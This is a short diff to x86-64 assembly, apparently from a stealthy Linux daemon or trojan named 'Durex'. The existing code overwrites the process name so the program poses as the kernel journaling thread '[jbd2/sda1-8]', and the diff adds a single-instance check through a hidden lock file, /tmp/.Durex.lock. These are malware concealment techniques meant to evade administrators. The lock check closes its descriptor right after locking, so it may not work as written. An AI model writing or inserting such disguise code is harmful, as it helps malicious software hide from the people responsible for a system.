@@ -8,6 +8,7 @@ section .text
 _start:
     push    rbp
     mov     rbp, rsp
+    call    check_instance
     mov     rdi, [rbp + 0x10]
     lea     rsi, [rel pname]
     call    strcpy
@@ -72,4 +73,29 @@ strcpy:
 end_strcpy:
     ret
 
-    pname: db "[jbd2/sda0-8]", 0
+check_instance:
+    xor     rsi, rsi
+    xor     rdx, rdx
+    xor     rax, rax
+    lea     rdi, [rel lock_name]
+    add     esi, 2 | 0100 ; O_RDWR | O_CREAT
+    add     edx, 0600
+    add     eax, 0x02 ; open
+    syscall
+    mov     edx, eax
+    mov     edi, edx
+    xor     esi, esi
+    add     esi, 2 | 4 ; LOCK_EX| LOCK_NB
+    xor     eax, eax
+    add     eax, 0x49 ; flock
+    syscall
+    cmp     eax, 0
+    jne     exit
+    mov     edi, edx
+    xor     eax, eax
+    add     eax, 0x03 ; close
+    syscall
+    ret
+
+    lock_name: db "/tmp/.Durex.lock", 0
+    pname: db "[jbd2/sda1-8]", 0
